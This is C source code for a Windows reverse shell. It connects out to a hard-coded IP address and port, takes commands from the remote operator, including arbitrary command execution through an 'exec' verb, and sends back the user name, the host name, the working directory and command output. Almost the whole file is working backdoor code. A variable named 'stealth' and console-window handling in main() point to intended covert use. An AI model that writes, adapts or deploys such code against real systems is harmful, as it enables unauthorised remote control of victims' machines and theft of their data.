#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <tchar.h>

#include <stdio.h>


#pragma comment(lib, "ws2_32.lib")
#define DEFAULT_BUFLEN 1024

const char *ip = "127.0.0.1";
int  port = 8080;

void execute(TCHAR* returnval, int returnsize, TCHAR* exec) {
    
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    DWORD readBytes;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        _tcscat(returnval, _T("[x] Error creating pipe.\n"));
        return;
    }

    ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, exec, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        _tcscat(returnval, _T("[x] Error executing command."));
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return;
    }

    CloseHandle(hWrite);

    while (ReadFile(hRead, returnval, returnsize - 1, &readBytes, NULL) && readBytes != 0) {
        returnval[readBytes / sizeof(TCHAR)] = _T('\0');
        _tcscat(returnval, _T("\n"));
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

}

void whoami(TCHAR* returnval, int returnsize) {
    DWORD bufferlen = returnsize;
    GetUserName(returnval, &bufferlen);
}

void hostname(TCHAR* returnval, int returnsize) {
    DWORD bufferlen = returnsize;
    GetComputerName(returnval, &bufferlen);
}

void pwd(TCHAR* returnval, int returnsize) {
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    _tcscat(returnval, tempvar);
}

void systeminfo(TCHAR* returnval, int returnsize) {
    STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	TCHAR pName[] = _T("systeminfo.exe");

	CreateProcess(NULL, pName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void RevShell() {

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
   
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = inet_addr(ip);
    addr.sin_port = htons(port);

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true) {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);

            if ((strcmp(CommandReceived, "whoami\n") == 0)) {
                TCHAR buffer[256] = _T("");
                whoami(buffer, 256);
                _tcscat(buffer, _T("\n"));
                send(tcpsock, (const char*)buffer, _tcslen(buffer) + 1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hostname\n") == 0)) {
                TCHAR buffer[257] = _T("");
                hostname(buffer,257);
                _tcscat(buffer, _T("\n"));
                send(tcpsock, (const char*)buffer, _tcslen(buffer) + 1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
                TCHAR buffer[257] = _T("");
                pwd(buffer,257);
                _tcscat(buffer, _T("\n"));
                send(tcpsock, (const char*)buffer, _tcslen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if (strcmp(CommandReceived, "systeminfo\n") == 0){
                TCHAR buffer[257] = _T("");
                systeminfo(buffer,257);
                _tcscat(buffer, _T("\n"));
                send(tcpsock, (const char*)buffer, _tcslen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "exit\n") == 0)) {
                closesocket(tcpsock);
                WSACleanup();
                exit(0);
            }
            else {
                char splitval[DEFAULT_BUFLEN] = "";
                for(int i = 0; i < (*(&CommandReceived + 1) - CommandReceived); i++) {
                    if(CommandReceived[i] == *" "){
                        break;
                    } else {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if((strcmp(splitval, "exec") == 0)) {
                    TCHAR CommandExec[DEFAULT_BUFLEN] = _T("");
                    int j = 0;
                    for (int i = 5; i < (*(&CommandReceived + 1) - CommandReceived); i++) {
                        CommandExec[j] = CommandReceived[i];
                        j++;
                    }
                    TCHAR buffer[257] = _T("");
                    execute(buffer, 257, CommandExec);
                    _tcscat(buffer, _T("\n"));
                    send(tcpsock, (const char*)buffer, _tcslen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                } else {
                    char buffer[20] = "Invalid Command\n";
                    send(tcpsock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
            }
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main() {

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_SHOWNORMAL);
    RevShell();
    return 0;

}